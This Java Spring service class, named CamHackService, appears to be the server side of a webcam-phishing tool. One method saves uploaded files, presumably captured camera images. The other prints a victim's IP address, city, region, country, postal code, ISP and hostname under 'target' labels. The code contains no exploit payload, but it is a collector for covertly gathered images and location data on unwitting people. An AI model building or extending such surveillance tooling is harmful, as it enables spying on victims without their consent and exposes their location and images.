package org.example;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.StringUtils;
import org.springframework.web.multipart.MultipartFile;

import java.nio.file.Files;
import java.nio.file.Path;

@Service
public class CamHackService {

    @Autowired
    HelperFunctions helperFunctions;

    public void saveFile(
            MultipartFile file){
        try{
            Path filePath = helperFunctions.getPathIfNotExists(file);
            Files.write(filePath, file.getBytes());
            System.out.println("file saved successfully at " + filePath);
        }catch (Exception e){
            System.out.println("error while saving file");
            //e.printStackTrace();
        }
    }

    public void getClientInfo(ClientInfo clientInfo){
        String clientIp = clientInfo.getClientIp();
        String city = clientInfo.getCity();
        String region = clientInfo.getRegion();
        String country = clientInfo.getCountry();
        String timezone = clientInfo.getTimezone();
        String postal = clientInfo.getPostal();
        String org = clientInfo.getOrg();
        String hostname = clientInfo.getHostname();
        System.out.printf("""
                target ip : %s,
                target city : %s,
                target region : %s,
                target country : %s
                target timezone : %s
                target postal : %s
                target org : %s
                target host : %s
                %n""",
                clientIp,city,region,country,timezone,postal,org,hostname);
    }


}
